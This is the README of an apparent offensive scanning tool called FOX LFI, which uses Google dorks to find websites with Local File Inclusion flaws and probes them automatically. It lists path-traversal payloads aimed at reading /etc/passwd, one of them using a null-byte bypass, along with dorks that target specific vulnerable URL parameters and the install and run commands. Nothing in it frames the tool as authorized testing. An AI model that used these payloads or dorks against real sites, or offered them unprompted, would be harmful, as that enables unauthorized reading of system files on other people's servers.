<a name="readme-top"></a>


<br />
<div align="center">
  <a href="https://github.com/othneildrew/Best-README-Template">
    <img src="https://i.imgur.com/PlZ6PEH.png" alt="Logo">
  </a>

  <h3 align="center">FOX LFI AUTOMATIC TOOLS🦊</h3>

  <p align="center">
    The FOX LFI Scanner is a powerful tool designed for scanning Local File Inclusion vulnerabilities.
  </p>
</div>

## Google Dork
Automatically search for vulnerabilities using google dork

```bash
/db/dorks.txt
```
## Payloads
This uses separate payloads, if you want to add a custom payload, go to:

```bash
/db/payloads.txt
```

Default payloads:
```bash
/etc/passwd
../../../../../../../../../../../etc/passwd
/../../../../../../../../../../../../etc/passwd
/..././..././..././..././..././..././..././etc/passwd%00
../../../../../../../..//etc/passwd
```

### Dork

```bash
inurl:/squirrelcart/cart_content.php?cart_isp_root=
inurl:index2.php?to=
inurl:index.php?load=
inurl:home.php?pagina=
```
## Installation

```bash
https://github.com/sandiskyy/Lfi-fox.git
```
```bash
cd Lfi-fox
```
```bash
pip3 install -r requirements.txt
```

## Usage
```bash
python3 Lfi-fox.py
```
## Note
Using Bing Still Not Working


